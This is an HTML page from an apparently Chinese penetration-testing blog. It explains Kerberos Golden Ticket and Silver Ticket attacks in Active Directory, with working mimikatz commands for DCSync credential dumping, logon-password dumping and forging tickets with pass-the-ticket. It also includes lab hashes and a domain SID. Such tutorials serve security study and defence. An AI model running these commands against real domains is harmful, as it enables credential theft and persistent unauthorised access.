@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Golden Ticket(黄金票据) 在AS_REQ &amp;amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。
+那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门
+制作黄金票据的前提条件 1、krbtgt用户的hash(就意味着你已经有域控制器权限了) cbcede6976ded273667a8e574a17092f 2、域名称 secice.cn 3、域的SID值 S-1-5-21-1431134449-3516206009-3475222595 4、要伪造的用户名(可以是任意用户甚至是不存在的用户) 黄金票据利用 先登录域控制器，dump krbtgt用户的hash值,获取域sid：
+1 2 3 mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash 也可以 mimikatz.exe &amp;#34;lsadump::dcsync /domain:secice.cn /user:krbtgt&amp;#34; exit &amp;gt;&amp;gt; 1.txt	//将导出的信息保存在1.txt中 切换到普通域用户的机器，生成TGT凭证,用户名随意:
+1 2 3 mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt 也可以 mimikatz.exe &amp;#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&amp;#34; &amp;#34;kerberos::list&amp;#34; exit 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。
+Silver Ticket(白银票据) 白银票据是出现在TGS_REQ &amp;amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。'>
+<title>Kerberos协议之黄金票据和白银票据</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/denbk947/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='Kerberos协议之黄金票据和白银票据'>
+<meta property='og:description' content='Golden Ticket(黄金票据) 在AS_REQ &amp;amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。
+那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门
+制作黄金票据的前提条件 1、krbtgt用户的hash(就意味着你已经有域控制器权限了) cbcede6976ded273667a8e574a17092f 2、域名称 secice.cn 3、域的SID值 S-1-5-21-1431134449-3516206009-3475222595 4、要伪造的用户名(可以是任意用户甚至是不存在的用户) 黄金票据利用 先登录域控制器，dump krbtgt用户的hash值,获取域sid：
+1 2 3 mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash 也可以 mimikatz.exe &amp;#34;lsadump::dcsync /domain:secice.cn /user:krbtgt&amp;#34; exit &amp;gt;&amp;gt; 1.txt	//将导出的信息保存在1.txt中 切换到普通域用户的机器，生成TGT凭证,用户名随意:
+1 2 3 mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt 也可以 mimikatz.exe &amp;#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&amp;#34; &amp;#34;kerberos::list&amp;#34; exit 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。
+Silver Ticket(白银票据) 白银票据是出现在TGS_REQ &amp;amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。'>
+<meta property='og:url' content='https://360rce.github.io/p/denbk947/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域渗透' /><meta property='article:published_time' content='2020-11-25T11:42:55&#43;00:00'/><meta property='article:modified_time' content='2020-11-25T11:42:55&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/jx/wallhaven-jxdw35.png' />
+<meta name="twitter:title" content="Kerberos协议之黄金票据和白银票据">
+<meta name="twitter:description" content="Golden Ticket(黄金票据) 在AS_REQ &amp;amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。
+那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门
+制作黄金票据的前提条件 1、krbtgt用户的hash(就意味着你已经有域控制器权限了) cbcede6976ded273667a8e574a17092f 2、域名称 secice.cn 3、域的SID值 S-1-5-21-1431134449-3516206009-3475222595 4、要伪造的用户名(可以是任意用户甚至是不存在的用户) 黄金票据利用 先登录域控制器，dump krbtgt用户的hash值,获取域sid：
+1 2 3 mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash 也可以 mimikatz.exe &amp;#34;lsadump::dcsync /domain:secice.cn /user:krbtgt&amp;#34; exit &amp;gt;&amp;gt; 1.txt	//将导出的信息保存在1.txt中 切换到普通域用户的机器，生成TGT凭证,用户名随意:
+1 2 3 mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt 也可以 mimikatz.exe &amp;#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&amp;#34; &amp;#34;kerberos::list&amp;#34; exit 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。
+Silver Ticket(白银票据) 白银票据是出现在TGS_REQ &amp;amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/jx/wallhaven-jxdw35.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
+            
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#golden-ticket黄金票据">Golden Ticket(黄金票据)</a>
+      <ol>
+        <li><a href="#制作黄金票据的前提条件">制作黄金票据的前提条件</a></li>
+        <li><a href="#黄金票据利用">黄金票据利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#silver-ticket白银票据">Silver Ticket(白银票据)</a>
+      <ol>
+        <li><a href="#伪造白银票据的前提条件">伪造白银票据的前提条件</a></li>
+        <li><a href="#白银票据利用">白银票据利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#两者区别">两者区别</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/denbk947/">
+                
+                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdw35.png" loading="lazy" alt="Featured image of post Kerberos协议之黄金票据和白银票据" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
+                吹梦到西州
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/denbk947/">Kerberos协议之黄金票据和白银票据</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2020/11/25</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="golden-ticket黄金票据">Golden Ticket(黄金票据)</h2>
+<p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p>
+<p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p>
+<h3 id="制作黄金票据的前提条件">制作黄金票据的前提条件</h3>
+<ul>
+<li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li>
+<li>2、域名称    secice.cn</li>
+<li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li>
+<li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li>
+</ul>
+<h3 id="黄金票据利用">黄金票据利用</h3>
+<p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash
+</span></span><span class="line"><span class="cl">也可以
+</span></span><span class="line"><span class="cl">mimikatz.exe &#34;lsadump::dcsync /domain:secice.cn /user:krbtgt&#34; exit &gt;&gt; 1.txt	//将导出的信息保存在1.txt中
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/denbk947/01.png"
+	width="766"
+	height="669"
+	srcset="/p/denbk947/01_huf011f00fc2b7bd404fa69b50cac55c7a_21639_480x0_resize_box_3.png 480w, /p/denbk947/01_huf011f00fc2b7bd404fa69b50cac55c7a_21639_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="黄金票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="114"
+		data-flex-basis="274px"
+	
+></p>
+<p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt
+</span></span><span class="line"><span class="cl">也可以
+</span></span><span class="line"><span class="cl">mimikatz.exe &#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&#34; &#34;kerberos::list&#34; exit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/denbk947/02.png"
+	width="1561"
+	height="707"
+	srcset="/p/denbk947/02_hu68ae437a2363f02592c36f99c4b7e03f_30272_480x0_resize_box_3.png 480w, /p/denbk947/02_hu68ae437a2363f02592c36f99c4b7e03f_30272_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="黄金票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="529px"
+	
+></p>
+<blockquote>
+<p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p>
+</blockquote>
+<h2 id="silver-ticket白银票据">Silver Ticket(白银票据)</h2>
+<p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p>
+<h3 id="伪造白银票据的前提条件">伪造白银票据的前提条件</h3>
+<ul>
+<li>1、域名称        secice.cn</li>
+<li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li>
+<li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li>
+<li>4、伪造的用户名(可以是任意的)</li>
+</ul>
+<p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p>
+<h3 id="白银票据利用">白银票据利用</h3>
+<p>首先登录域控，dump机器hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">也可以
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit &gt;&gt; 1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/denbk947/03.png"
+	width="767"
+	height="698"
+	srcset="/p/denbk947/03_hu340416e9a86918f7174279f74051a03c_19311_480x0_resize_box_3.png 480w, /p/denbk947/03_hu340416e9a86918f7174279f74051a03c_19311_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="白银票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="263px"
+	
+></p>
+<p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe privilege::debug &#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&#34; exit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/denbk947/04.png"
+	width="1791"
+	height="461"
+	srcset="/p/denbk947/04_hub5208412b635e69992b978e76b923c23_21446_480x0_resize_box_3.png 480w, /p/denbk947/04_hub5208412b635e69992b978e76b923c23_21446_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="白银票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="388"
+		data-flex-basis="932px"
+	
+></p>
+<p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p>
+<p><img src="/p/denbk947/05.png"
+	width="481"
+	height="258"
+	srcset="/p/denbk947/05_hu4c098ada5e2a9f9cb2e6350f30167ee4_7285_480x0_resize_box_3.png 480w, /p/denbk947/05_hu4c098ada5e2a9f9cb2e6350f30167ee4_7285_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="白银票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>不仅仅是cifs服务还有其他：</p>
+<p><img src="/p/denbk947/06.png"
+	width="767"
+	height="511"
+	srcset="/p/denbk947/06_hu55f34af6afa11860a5fde95f437ee04f_29112_480x0_resize_box_3.png 480w, /p/denbk947/06_hu55f34af6afa11860a5fde95f437ee04f_29112_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="白银票据利用"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p>ldap可以用来dcsync</p>
+<h2 id="两者区别">两者区别</h2>
+<ol>
+<li>访问权限不同
+Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限
+Silver Ticket: 伪造 TGS,只能访问指定的服务</li>
+<li>加密方式不同
+Golden Ticket 由 krbtgt 的 Hash 加密
+Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li>
+<li>认证流程不同
+Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/mg0ziixb/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2y9y.jpg" loading="lazy" data-key="mg0ziixb" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2y9y.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">域渗透之Kerberos协议</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/mljrguh0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/p9/wallhaven-p9goyp.png" loading="lazy" data-key="mljrguh0" data-hash="https://w.wallhaven.cc/full/p9/wallhaven-p9goyp.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">彻底理解Windows认证</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/whp5em3l/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg" loading="lazy" data-key="whp5em3l" data-hash="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">关于微信内置浏览器 达到持久控制</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/1ypylhrh/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2or6.png" loading="lazy" data-key="1ypylhrh" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2or6.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Golang学习之并发编程</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xb9uhh7c/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/gp/wallhaven-gpd95q.png" loading="lazy" data-key="xb9uhh7c" data-hash="https://w.wallhaven.cc/full/gp/wallhaven-gpd95q.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Golang学习之异常与文本文件处理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
